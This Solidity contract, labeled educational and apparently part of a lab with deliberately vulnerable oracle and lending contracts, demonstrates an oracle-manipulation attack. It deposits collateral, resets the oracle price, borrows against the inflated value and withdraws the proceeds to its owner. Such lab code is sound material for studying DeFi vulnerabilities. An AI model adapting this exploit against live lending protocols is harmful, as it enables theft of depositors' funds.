// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../vulnerable/VulnerableOracle.sol";
import "../vulnerable/VulnerableLending.sol";

// EDUCATIONAL: Demonstrates oracle manipulation attack
contract OracleManipulator {
    VulnerableOracle public oracle;
    VulnerableLending public lending;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setup(address _oracle, address _lending) external onlyOwner {
        oracle = VulnerableOracle(_oracle);
        lending = VulnerableLending(payable(_lending));
    }

    function manipulateAndBorrow(uint256 newPrice, uint256 borrowAmount)
        external
        payable
        onlyOwner
    {
        lending.deposit{value: msg.value}();
        oracle.setPrice(newPrice);
        lending.borrow(borrowAmount);
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
